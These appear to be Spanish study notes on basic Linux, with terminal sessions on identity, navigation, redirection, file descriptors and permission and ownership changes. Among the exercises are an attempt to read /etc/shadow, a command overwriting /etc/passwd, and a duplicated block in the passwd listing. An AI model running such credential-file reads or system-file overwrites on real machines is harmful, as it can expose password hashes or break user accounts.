*-------------------------------*
*Conceptos básicos de Linux*
*-------------------------------*
```linux
❯ whoami
k4rma
❯ id
uid=1000(k4rma) gid=1003(k4rma) grupos=1003(k4rma),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),108(netdev),116(bluetooth),1000(lpadmin),1001(scanner),1002(docker)
❯ sudo su
[sudo] password for k4rma:
❯ whoami
root
❯ id
uid=0(root) gid=0(root) grupos=0(root)
❯ exit
❯ whoami
k4rma
❯ sudo su
❯ whoami
root
❯ exit
❯ sudo id
uid=0(root) gid=0(root) grupos=0(root)
❯ cat /etc/group  (en verdad es un batcat por el alias que le hemos asignado)

       │ File: /etc/group
───────┼────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ root:x:0:
   2   │ daemon:x:1:
   3   │ bin:x:2:
   4   │ sys:x:3:
   5   │ adm:x:4:
   6   │ tty:x:5:
   7   │ disk:x:6:
   8   │ lp:x:7:
   9   │ mail:x:8:
  10   │ news:x:9:
  11   │ uucp:x:10:
  12   │ man:x:12:
  13   │ proxy:x:13:
  14   │ kmem:x:15:
  15   │ dialout:x:20:
  16   │ fax:x:21:
  17   │ voice:x:22:
  18   │ cdrom:x:24:k4rma
  19   │ floppy:x:25:k4rma
  20   │ tape:x:26:
  21   │ sudo:x:27:k4rma
  22   │ audio:x:29:pulse,k4rma
  23   │ dip:x:30:k4rma
  24   │ www-data:x:33:
  25   │ backup:x:34:
  26   │ operator:x:37:
  27   │ list:x:38:
  28   │ irc:x:39:
  29   │ src:x:40:
  30   │ gnats:x:41:
  31   │ shadow:x:42:
  32   │ utmp:x:43:
  33   │ video:x:44:k4rma
  34   │ sasl:x:45:
  35   │ plugdev:x:46:k4rma
  36   │ staff:x:50:
  37   │ games:x:60:
  38   │ users:x:100:
  39   │ nogroup:x:65534:
  40   │ systemd-journal:x:101:
  41   │ systemd-network:x:102:
  42   │ systemd-resolve:x:103:
  43   │ input:x:104:
  44   │ kvm:x:105:
  45   │ render:x:106:
  46   │ crontab:x:107:
  47   │ netdev:x:108:k4rma
  48   │ tss:x:109:
  49   │ messagebus:x:110:
  50   │ systemd-timesync:x:111:
  51   │ Debian-exim:x:112:
  52   │ uuidd:x:113:
  53   │ debian-tor:x:114:
  54   │ ssh:x:115:
  55   │ bluetooth:x:116:k4rma
  56   │ rtkit:x:117:
  57   │ vboxsf:x:118:
  58   │ avahi:x:119:
  59   │ nm-openvpn:x:120:
  60   │ nm-openconnect:x:121:
  61   │ pulse:x:122:
  62   │ pulse-access:x:123:
  63   │ geoclue:x:124:
  64   │ lightdm:x:125:
  65   │ sgx:x:126:
  66   │ pipewire:x:127:
  67   │ tcpdump:x:128:
  68   │ rdma:x:129:
  69   │ stunnel4:x:130:
  70   │ sslh:x:131:
  71   │ ssl-cert:x:132:postgres
  72   │ ntp:x:133:
  73   │ postgres:x:134:
  74   │ arpwatch:x:135:
  75   │ sambashare:x:999:
  76   │ redis:x:136:_gvm
  77   │ inetsim:x:137:
  78   │ wireshark:x:138:
  79   │ _gvm:x:139:
  80   │ beef-xss:x:140:
  81   │ lpadmin:x:1000:k4rma
  82   │ scanner:x:1001:k4rma
  83   │ docker:x:1002:k4rma
  84   │ k4rma:x:1003:
:q

--------------------------------------------------------------------------------------
ctr+l -> para borrar la pantalla, sin hacer clear y mantener lo que estas escribiendo
--------------------------------------------------------------------------------------
❯ pwd
/home/k4rma
❯ cd Descargas
❯ cd ..
❯ cd Descargas
❯ pwd
/home/k4rma/Descargas
❯ cd ..
❯ cd ..
❯ pwd
/home
❯ cd /home/k4rma/Descargas/blue-sky/polybar
❯ pwd
/home/k4rma/Descargas/blue-sky/polybar
❯ cd ..
❯ cd
❯ pwd
/home/k4rma
❯ which whoami
/usr/bin/whoami
❯/usr/bin/whoami
k4rma
❯ echo $PATH
/home/k4rma/.local/bin:/snap/bin:/usr/sandbox/:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games:/usr/share/games:/usr/local/sbin:/usr/sbin:/sbin:/opt/nvim-linux64/bin:/opt/i3lock-fancy:/opt/kitty/bin:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games:/home/k4rma/.fzf/bin
❯ id
uid=1000(k4rma) gid=1003(k4rma) grupos=1003(k4rma),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),108(netdev),116(bluetooth),1000(lpadmin),1001(scanner),1002(docker)
❯ /bin/cat /etc/group | grep "floppy" -n
19:floppy:x:25:k4rma
---------------------------------------------------------
si which no reporta nada, ninguna ruta absoluta, command
---------------------------------------------------------
❯ command -v whoami
/usr/bin/whoami
❯ ls
 Descargas   Desktop   Documentos   HTB   Imágenes   Música   powerlevel10k   Público   Templates   Vídeos
❯ /bin/ls (para tirar del ls sin lsd que esta con alias)
Descargas  Desktop  Documentos  HTB  Imágenes  Música  powerlevel10k  Público  Templates  Vídeos
❯ which ls
ls: aliased to lsd --group-dirs=first
❯ ls -l
drwxr-xr-x k4rma k4rma 174 B Wed Jan  4 13:35:24 2023  Descargas
drwxr-xr-x k4rma k4rma  38 B Mon Jan  2 22:34:39 2023  Desktop
drwxr-xr-x k4rma k4rma  14 B Tue Jan 17 02:24:55 2023  Documentos
drwxr-xr-x k4rma k4rma   0 B Tue Jan  3 20:19:09 2023  HTB
drwxr-xr-x k4rma k4rma   0 B Thu Dec 22 18:07:49 2022  Imágenes
drwxr-xr-x k4rma k4rma   0 B Thu Dec 22 18:07:49 2022  Música
drwxr-xr-x k4rma k4rma 496 B Mon Jan  2 12:14:51 2023  powerlevel10k
drwxr-xr-x k4rma k4rma   0 B Thu Dec 22 18:07:49 2022  Público
drwxr-xr-x k4rma k4rma  22 B Tue Nov 22 21:19:40 2022  Templates
drwxr-xr-x k4rma k4rma   0 B Thu Dec 22 18:07:49 2022  Vídeos
❯ pwd
/home/k4rma
❯ cd Descargas
❯ cd ..
❯ cd Descargas
❯ pwd
/home/k4rma/Descargas
❯ cd ..
❯ cd ..
❯ pwd
/home
❯ cd /home/k4rma/Descargas/blue-sky/polybar
❯ pwd
/home/k4rma/Descargas/blue-sky/polybar
❯ cd ..
❯ cd
❯ pwd
/home/k4rma
------------------
Para ir a la raiz
------------------
❯ cd /
❯ pwd
/
❯ ls
 bin    dev   home   lib32   libx32   mnt   proc   run    srv   tmp   var                  initrd.img       vmlinuz
 boot   etc   lib    lib64   media    opt   root   sbin   sys   usr   crypto_keyfile.bin   initrd.img.old   vmlinuz.old
❯ cd
❯ pwd
/home/k4rma
echo $HOME
/home/k4rma
-------------------------------------------
Para los directorios personales de usuario
-------------------------------------------
❯ cat /etc/passwd

File: /etc/passwd
───────┼────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ root:x:0:0:root:/root:/usr/bin/zsh
   2   │ daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
   3   │ bin:x:2:2:bin:/bin:/usr/sbin/nologin
   4   │ sys:x:3:3:sys:/dev:/usr/sbin/nologin
   5   │ sync:x:4:65534:sync:/bin:/bin/sync
   6   │ games:x:5:60:games:/usr/games:/usr/sbin/nologin
   7   │ man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
   8   │ lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
   9   │ mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
  10   │ news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
  11   │ uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
  12   │ proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
  13   │ www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
  14   │ backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
  15   │ list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
  16   │ irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
  17   │ gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
  18   │ nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
  19   │ _apt:x:100:65534::/nonexistent:/usr/sbin/nologin
  20   │ systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
  21   │ systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
  22   │ tss:x:103:109:TPM software stack,,,:/var/lib/tpm:/bin/false
  23   │ strongswan:x:104:65534::/var/lib/strongswan:/usr/sbin/nologin
  24   │ messagebus:x:105:110::/nonexistent:/usr/sbin/nologin
  25   │ systemd-timesync:x:106:111:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
  26   │ Debian-exim:x:107:112::/var/spool/exim4:/usr/sbin/nologin
  27   │ uuidd:x:108:113::/run/uuidd:/usr/sbin/nologin
  28   │ debian-tor:x:109:114::/var/lib/tor:/bin/false
  29   │ usbmux:x:110:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
  30   │ rtkit:x:111:117:RealtimeKit,,,:/proc:/usr/sbin/nologin
  31   │ dnsmasq:x:112:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
  32   │ avahi:x:113:119:Avahi mDNS daemon,,,:/run/avahi-daemon:/usr/sbin/nologin
  33   │ nm-openvpn:x:114:120:NetworkManager OpenVPN,,,:/var/lib/openvpn/chroot:/usr/sbin/nologin
  19   │ _apt:x:100:65534::/nonexistent:/usr/sbin/nologin
  20   │ systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
  21   │ systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
  22   │ tss:x:103:109:TPM software stack,,,:/var/lib/tpm:/bin/false
  23   │ strongswan:x:104:65534::/var/lib/strongswan:/usr/sbin/nologin
  24   │ messagebus:x:105:110::/nonexistent:/usr/sbin/nologin
  25   │ systemd-timesync:x:106:111:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
  26   │ Debian-exim:x:107:112::/var/spool/exim4:/usr/sbin/nologin
  27   │ uuidd:x:108:113::/run/uuidd:/usr/sbin/nologin
  28   │ debian-tor:x:109:114::/var/lib/tor:/bin/false
  29   │ usbmux:x:110:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
  30   │ rtkit:x:111:117:RealtimeKit,,,:/proc:/usr/sbin/nologin
  31   │ dnsmasq:x:112:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
  32   │ avahi:x:113:119:Avahi mDNS daemon,,,:/run/avahi-daemon:/usr/sbin/nologin
  33   │ nm-openvpn:x:114:120:NetworkManager OpenVPN,,,:/var/lib/openvpn/chroot:/usr/sbin/nologin
  34   │ nm-openconnect:x:115:121:NetworkManager OpenConnect plugin,,,:/var/lib/NetworkManager:/usr/sbin/nologin
  35   │ speech-dispatcher:x:116:29:Speech Dispatcher,,,:/run/speech-dispatcher:/bin/false
  36   │ pulse:x:117:122:PulseAudio daemon,,,:/run/pulse:/usr/sbin/nologin
  37   │ geoclue:x:118:124::/var/lib/geoclue:/usr/sbin/nologin
  38   │ lightdm:x:119:125:Light Display Manager:/var/lib/lightdm:/bin/false
  39   │ tcpdump:x:120:128::/nonexistent:/usr/sbin/nologin
  40   │ stunnel4:x:121:130::/var/run/stunnel4:/usr/sbin/nologin
  41   │ sshd:x:122:65534::/run/sshd:/usr/sbin/nologin
  42   │ sslh:x:123:131::/nonexistent:/usr/sbin/nologin
  43   │ ntp:x:124:133::/nonexistent:/usr/sbin/nologin
  44   │ postgres:x:125:134:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash
  45   │ arpwatch:x:126:135:ARP Watcher,,,:/var/lib/arpwatch:/bin/sh
  46   │ miredo-server:x:127:65534::/var/run/miredo-server:/usr/sbin/nologin
  47   │ iodine:x:128:65534::/run/iodine:/usr/sbin/nologin
  48   │ miredo:x:129:65534::/var/run/miredo:/usr/sbin/nologin
  49   │ redis:x:130:136::/var/lib/redis:/usr/sbin/nologin
  50   │ inetsim:x:131:137::/var/lib/inetsim:/usr/sbin/nologin
  51   │ _gvm:x:132:139::/var/lib/openvas:/usr/sbin/nologin
  52   │ beef-xss:x:133:140::/var/lib/beef-xss:/usr/sbin/nologin
  53   │ k4rma:x:1000:1003:k4rma:/home/k4rma:/usr/bin/zsh
───────┴──────────────────────────────────────────────────

❯ id
uid=1000(k4rma) gid=1003(k4rma) grupos=1003(k4rma),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),108(netdev),116(bluetooth),1000(lpadmin),1001(scanner),1002(docker)
❯ echo $SHELL
/usr/bin/zsh
❯ cat /etc/shells
───────┬────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: /etc/shells
───────┼────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ # /etc/shells: valid login shells
   2   │ /bin/sh
   3   │ /bin/bash
   4   │ /usr/bin/bash
   5   │ /bin/rbash
   6   │ /usr/bin/rbash
   7   │ /bin/dash
   8   │ /usr/bin/dash
   9   │ /usr/bin/pwsh
  10   │ /opt/microsoft/powershell/7/pwsh
  11   │ /usr/bin/tmux
  12   │ /usr/bin/screen
  13   │ /bin/zsh
  14   │ /usr/bin/zsh
───────┴────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
❯ echo $PATH
/home/k4rma/.local/bin:/snap/bin:/usr/sandbox/:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games:/usr/share/games:/usr/local/sbin:/usr/sbin:/sbin:/opt/nvim-linux64/bin:/opt/i3lock-fancy:/opt/kitty/bin:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games:/home/k4rma/.fzf/bin
❯ echo $SHELL
/usr/bin/zsh
❯ bash
┌─[k4rma@parrot]─[~]
└──╼ $ls
Descargas  Desktop  Documentos  HTB  Imágenes  Música  powerlevel10k  Público  Templates  Vídeos
┌─[k4rma@parrot]─[~]
└──╼ $cd Desktop/
┌─[k4rma@parrot]─[~/Desktop]
└──╼ $ls
k4rma  README.license
-------------------
Concatenar ordenes
-------------------
❯ whoami; ls
k4rma
 Descargas   Desktop   Documentos   HTB   Imágenes   Música   powerlevel10k   Público   Templates   Vídeos
-----------------------------------------------------------------
Muestrame ls solo si whoam, al no existir el comando no enseña ls
-----------------------------------------------------------------
❯ whoam && ls
zsh: command not found: whoam
❯ cat /etc/hosts
───────┬────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: /etc/hosts
───────┼────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ # Host addresses
   2   │ 127.0.0.1  localhost
   3   │ 127.0.1.1  parrot
   4   │ ::1        localhost ip6-localhost ip6-loopback
   5   │ ff02::1    ip6-allnodes
   6   │ ff02::2    ip6-allrouters
   7   │ # Others
───────┴────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
```

-  Chuleta de comandos Linux: [https://ciberninjas.com/chuleta-comandos-linux/](https://ciberninjas.com/chuleta-comandos-linux/)

- Comandos básicos de Linux: [https://www.bonaval.com/kb/cheats-chuletas/comandos-basicos-linux](https://www.bonaval.com/kb/cheats-chuletas/comandos-basicos-linux)

![[tutorial0.pdf]]


*-----------------------------------*
 *Control flujo stderr-stdout, etc*
*-----------------------------------*
```linux
-------------------------------------
Si es exitoso es 0-> Codigo de estado
-------------------------------------
❯ echo $?
0
❯ whoam
zsh: command not found: whoam

---------------------------------------------
En este caso no es exitoso-> Codigo de estado
---------------------------------------------
❯ echo $?
127

---------------------------------------------------------------------------------------------------------
Para redirigir los errores (stderr), no verlos, cuando entras en un bucle es interesante usar 2>/dev/null
---------------------------------------------------------------------------------------------------------

❯ whoam 2>/dev/null
❯ whoami 2>/dev/null
k4rma
❯ whoam 2>/dev/null
------
No te imprime el error
------
❯ cat /etc/host 2>/dev/null
------
Te imprime el stdout
------
❯ cat /etc/hosts 2>/dev/null
───────┬────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: /etc/hosts
───────┼────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ # Host addresses
   2   │ 127.0.0.1  localhost
   3   │ 127.0.1.1  parrot
   4   │ ::1        localhost ip6-localhost ip6-loopback
   5   │ ff02::1    ip6-allnodes
   6   │ ff02::2    ip6-allrouters
   7   │ # Others
───────┴────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────

------------------------------------------------------------------------
Para que no te imprima el stdout, todo el flujo se redirige al /dev/null
------------------------------------------------------------------------
❯ cat /etc/hosts >/dev/null

--------------------------------------
Pero los errores se siguen imprimiendo
--------------------------------------
❯ cat /etc/host >/dev/null
[bat error]: '/etc/host': No such file or directory (os error 2)

-----------------------------------------------------
tanto el stdout como stderr son redirigir a /dev/null
-----------------------------------------------------
❯ cat /etc/host >/dev/null 2>&1
❯ cat /etc/host &>/dev/null

-------------------------------------------------------------
Ejemplo, asi no te reporta el output de que se está corriendo
-------------------------------------------------------------
wireshark &>/dev/null

---------------------------------------------------------------------------------------------------------
Asi solo te reporta el PID, numero identificativo del proceso, cada programa corriendo tiene uno (&=hilo)
---------------------------------------------------------------------------------------------------------
❯ wireshark &>/dev/null &
[1] 116809

---------------------------------------------------------
Al ser un proceso que cuelga del padre no se puede cerrar
---------------------------------------------------------
❯ exit
zsh: you have running jobs.

-------------------------------------------------------
Para tener el proceso de fondo y poder usar la terminal
-------------------------------------------------------
❯ wireshark &>/dev/null & disown
[1] 121224

```


*----------------------------*
  *Descriptores de archivo*
*----------------------------*
```linux
❯ exec 3<> file  //Para generar un descriptor de archivo <capacidad de lectura >capacidad de escritura
❯ ls -l
.rw-r--r-- k4rma k4rma 0 B Tue Jan 17 11:17:39 2023  file
❯ cat file
───────┬────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: file   <EMPTY>
───────┴────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
❯ whoami >&3
❯ cat file
───────┬────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: file
───────┼────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ k4rma
───────┴────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
❯ pwd >&3
❯ cat file
───────┬────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: file
───────┼────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ k4rma
   2   │ /home/k4rma/Desktop/k4rma/exercises
───────┴────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
❯ exec 3>&- //cerrar descriptor de archivo
❯ ls >&3
zsh: 3: descriptor de fichero erróneo // Al estar cerrado no te lo reconoce
❯ exec 5<> data
❯ whoami >&5
❯ cat data
───────┬────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: data
───────┼────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ k4rma
───────┴────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
❯ exec 8>&5 // creamos una copia del 8 en el 5, todo lo que hagamos en el 8 irá al 5
❯ cat data
───────┬────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: data
───────┼────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ k4rma
───────┴────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
❯ pwd >&5
❯ cat data
───────┬────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: data
───────┼────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ k4rma
   2   │ /home/k4rma/Desktop/k4rma/exercises
───────┴────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
❯ who -q >&8 //Aqui vemos como se copia en el 5
❯ cat data
───────┬────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: data
───────┼────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ k4rma
   2   │ /home/k4rma/Desktop/k4rma/exercises
   3   │ k4rma
   4   │ Nº de usuarios=1
───────┴────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
❯ exec 5>&- //cerramos
❯ cat /etc/hosts >&5
zsh: 5: descriptor de fichero erróneo

❯ exec 6>&5- //De esta forma copia de 6 a 5 pero cierras 5.

----
ESCRITURA DE ARCHIVOS
----
❯ echo "Hola probando" > file
❯ cat file
───────┬────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: file
───────┼────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ Hola probando
───────┴────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
❯ echo "No se concatena, lo fusila" > file
❯ cat file
───────┬────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: file
───────┼────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ No se concatena, lo fusila
───────┴────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
❯ echo "Utilizando el doble >> lo concatenariamos :-D" >> file
❯ cat file
───────┬────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: file
───────┼────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ No se concatena, lo fusila
   2   │ Utilizando el doble >> lo concatenariamos :-D
───────┴────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
❯ nano file
❯ cat file
───────┬────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: file
───────┼────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ No se concatena, lo fusila
   2   │ Utilizando el doble >> lo concatenariamos :-D
   3   │ Ahora utilizando NANO
───────┴────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
❯ vim file
❯ cat file
───────┬────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: file
───────┼────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ No se concatena, lo fusila
   2   │ Utilizando el doble >> lo concatenariamos :-D
   3   │ Ahora utilizando NANO
   4   │ Ahora estoy utilizando VIM
───────┴────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────

```

![[bash-redirections-cheat-sheet 1.pdf]]


*---------------*
*Cuestionario*
*---------------*
![[Pasted image 20240707190045.png|950]]
![[Pasted image 20240707190102.png|950]]
![[Pasted image 20240707190227.png|950]]
![[Pasted image 20240707190248.png|950]]
![[Pasted image 20240707190307.png|950]]

*---------------------------------------------*
  *Interpretación y Asignación de permisos*
*---------------------------------------------*
```linux
❯ ls -l /etc/passwd
.rw-r--r-- root root 3.0 KB Mon Jan  2 12:45:12 2023  /etc/passwd
❯ echo "hola" > /etc/passwd
❯ nano /etc/passwd
❯ ls -l /etc/shadow
.rw-r----- root shadow 1.6 KB Thu Dec 22 17:46:01 2022  /etc/shadow
❯ cat /etc/shadow
[bat error]: '/etc/shadow': Permission denied (os error 13)
❯ sudo su
[sudo] password for k4rma:
❯ exit
❯ cat /etc/login.defs | grep "ENCRYPT_METHOD"
# This variable is deprecated. You should use ENCRYPT_METHOD.
ENCRYPT_METHOD SHA512
# Only used if ENCRYPT_METHOD is set to SHA256 or SHA512.

--------------------------------------------------------------------------------
intentamos crear fichero y directorio desde k4rma pero no tengo permisos (Other)
--------------------------------------------------------------------------------
❯ touch lakdjfk
❯ ls -l
❯ mkdir prueba 2
❯ ls -l
❯ cd..
❯ cd ..
❯ ls -l
drwxr-xr-x k4rma k4rma  30 B  Tue Jan 17 10:41:02 2023  k4rma
drwxr-xr-x root  root    0 B  Tue Jan 17 12:39:22 2023  prueba
.rwxr-xr-x k4rma k4rma 2.0 KB Mon May  2 18:22:50 2022  README.license

--------------------------------------------------------
Estamos cambiando privilegios y permisos del grupo other
--------------------------------------------------------
❯ sudo su
❯ chmod o+w
❯ chmod o+w prueba
❯ ls -l
drwxr-xr-x k4rma k4rma  30 B  Tue Jan 17 10:41:02 2023  k4rma
drwxr-xrwx root  root    0 B  Tue Jan 17 12:39:22 2023  prueba
.rwxr-xr-x k4rma k4rma 2.0 KB Mon May  2 18:22:50 2022  README.license
❯ exit
❯ cd prueba
❯ touch aldjdjfk
❯ ls -l
.rw-r--r-- k4rma k4rma 0 B Tue Jan 17 12:42:37 2023  aldjdjfk
❯ cd ..
❯ cd prueba
❯ mkdir test
❯ ls -l
drwxr-xr-x k4rma k4rma 0 B Tue Jan 17 12:44:08 2023  test
.rw-r--r-- k4rma k4rma 0 B Tue Jan 17 12:42:37 2023  aldjdjfk
❯ rm -r * // r(recursiva)para que borre todo incluido subcarpetas, y * para que borre todo a la vez no uno a uno
zsh: sure you want to delete all 2 files in /home/k4rma/Desktop/prueba [yn]? y
❯
❯ ls -l

----------------------------------
Quitamos los privilegios que dimos
----------------------------------
❯ chmod o-w prueba
❯ ls -l
drwxr-xr-x k4rma k4rma  30 B  Tue Jan 17 10:41:02 2023  k4rma
drwxr-xr-x root  root    0 B  Tue Jan 17 12:44:46 2023  prueba
.rwxr-xr-x k4rma k4rma 2.0 KB Mon May  2 18:22:50 2022  README.license

---------------------------------------------------------
Cambiamos el grupo a k4rma, hemos pasado de otros a grupo
---------------------------------------------------------
❯ chgrp k4rma prueba
❯ ls -l
drwxr-xr-x k4rma k4rma  30 B  Tue Jan 17 10:41:02 2023  k4rma
drwxr-xr-x root  k4rma   0 B  Tue Jan 17 12:44:46 2023  prueba
.rwxr-xr-x k4rma k4rma 2.0 KB Mon May  2 18:22:50 2022  README.license

---------------------
Aportando privilegios
---------------------
❯ chmod g+w prueba
❯ ls -l
drwxr-xr-x k4rma k4rma  30 B  Tue Jan 17 10:41:02 2023  k4rma
drwxrwxr-x root  k4rma   0 B  Tue Jan 17 12:44:46 2023  prueba
.rwxr-xr-x k4rma k4rma 2.0 KB Mon May  2 18:22:50 2022  README.license
❯ cd prueba
❯ touch fichero
❯ mkdir direcctorio
❯ ls -l
drwxr-xr-x root root 0 B Tue Jan 17 12:53:39 2023  direcctorio
.rw-r--r-- root root 0 B Tue Jan 17 12:53:32 2023  fichero

---------------------------------------------
Cambio de privilegios entre grupos y usuarios
---------------------------------------------
❯ cd Documentos
❯ ls -l
drwxr-xr-x k4rma k4rma 104 B Wed Jan 18 10:46:11 2023  apuntes
drwxr-xr-x root  root    0 B Wed Jan 18 10:48:02 2023  pepe
❯ useradd pepe -s /bin/bash -d /home/pepe
❯ cat /etc/passwd | grep pepe
pepe:x:1001:1004::/home/pepe:/bin/bash
❯ cat /etc/group | grep pepe
pepe:x:1004:
❯ passwd pepe
Nueva contraseña:
Vuelva a escribir la nueva contraseña:
passwd: contraseña actualizada correctamente
❯ ls -l
drwxr-xr-x k4rma k4rma 104 B Wed Jan 18 10:46:11 2023  apuntes
drwxr-xr-x root  root    0 B Wed Jan 18 10:48:02 2023  pepe
❯ chgrp pepe pepe
❯ ls -l
drwxr-xr-x k4rma k4rma 104 B Wed Jan 18 10:46:11 2023  apuntes
drwxr-xr-x root  pepe    0 B Wed Jan 18 10:48:02 2023  pepe
❯ chown pepe pepe
❯ ls -l
drwxr-xr-x k4rma k4rma 104 B Wed Jan 18 10:46:11 2023  apuntes
drwxr-xr-x pepe  pepe    0 B Wed Jan 18 10:48:02 2023  pepe
❯ chown k4rma:root pepe
❯ ls -l
drwxr-xr-x k4rma k4rma 104 B Wed Jan 18 10:46:11 2023  apuntes
drwxr-xr-x k4rma root    0 B Wed Jan 18 10:48:02 2023  pepe
❯ chown pepe:pepe pepe
❯ ls -l
drwxr-xr-x k4rma k4rma 104 B Wed Jan 18 10:46:11 2023  apuntes
drwxr-xr-x pepe  pepe    0 B Wed Jan 18 10:48:02 2023  pepe
❯ su pepe
┌─[pepe@parrot]─[/home/k4rma/Documentos]
└──╼ $whoami
pepe
┌─[pepe@parrot]─[/home/k4rma/Documentos]
└──╼ $pwd
/home/k4rma/Documentos
┌─[pepe@parrot]─[/home/k4rma/Documentos]
└──╼ $exit
exit
❯ groupadd ALumnos
❯ cat /etc/group | grep ALumnos
ALumnos:x:1005:
❯ usermod -a -G ALumnos pepe
❯ cat /etc/group | grep ALumnos
ALumnos:x:1005:pepe
❯ su pepe
┌─pepe@parrot]─[/home/k4rma/Documentos]
└──╼ $id
uid=1001(pepe) gid=1004(pepe) grupos=1004(pepe),1005(ALumnos)
┌─[pepe@parrot]─[/home/k4rma/Documentos]
└──╼ $exit
exit
❯ cd Desktop
❯ chmod o-rx prueba
❯ ls -l
drwxr-xr-x k4rma k4rma  30 B  Tue Jan 17 10:41:02 2023  k4rma
drw--w--w- root  k4rma   0 B  Tue Jan 17 12:58:58 2023  prueba
.rwxr-xr-x k4rma k4rma 2.0 KB Mon May  2 18:22:50 2022  README.license
❯ chmod o-w prueba
❯ ls -l
drwxr-xr-x k4rma k4rma  30 B  Tue Jan 17 10:41:02 2023  k4rma
drw--w---- root  k4rma   0 B  Tue Jan 17 12:58:58 2023  prueba
.rwxr-xr-x k4rma k4rma 2.0 KB Mon May  2 18:22:50 2022  README.license
❯ chgrp Alumno prueba
chgrp: grupo inválido: «Alumno»
❯ chgrp ALumno prueba
chgrp: grupo inválido: «ALumno»
❯ chgrp ALumnos prueba
❯ ls -l
drwxr-xr-x k4rma k4rma    30 B  Tue Jan 17 10:41:02 2023  k4rma
drw--w---- root  ALumnos   0 B  Tue Jan 17 12:58:58 2023  prueba
.rwxr-xr-x k4rma k4rma   2.0 KB Mon May  2 18:22:50 2022  README.license
❯ chmod g+w prueba
❯ ls -l
drwxr-xr-x k4rma k4rma    30 B  Tue Jan 17 10:41:02 2023  k4rma
drw--w---- root  ALumnos   0 B  Tue Jan 17 12:58:58 2023  prueba
